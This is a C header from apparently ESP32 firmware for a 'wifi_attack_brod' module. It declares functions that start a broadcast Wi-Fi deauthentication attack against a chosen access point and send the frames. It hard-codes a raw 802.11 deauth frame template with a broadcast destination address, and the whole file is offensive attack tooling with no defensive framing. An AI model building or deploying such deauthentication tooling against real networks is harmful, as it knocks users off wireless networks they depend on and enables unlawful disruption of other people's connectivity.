#include "esp_wifi.h"
#ifndef WIFI_ATTACK_BROD_H
  #define WIFI_ATTACK_BROD_H
  #define TAG_WIFI_ATTACL_BROD_MODULE "module:wifi_attack_brod"
  #define DEFAULT_SCAN_LIST_SIZE      CONFIG_SCAN_MAX_AP

const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

typedef struct {
  const uint8_t* frame_buffer;
  int size;
  int task_id;
} deauth_frame_t;

void wifi_attack_brod_module_start(wifi_ap_record_t* ap_target);
void wifi_attack_brod_create_task(void* pvParameters);
void wifi_attack_brod_send_deauth_frame(deauth_frame_t* deauth_frame);

#endif  // WIFI_ATTACK_BROD_H
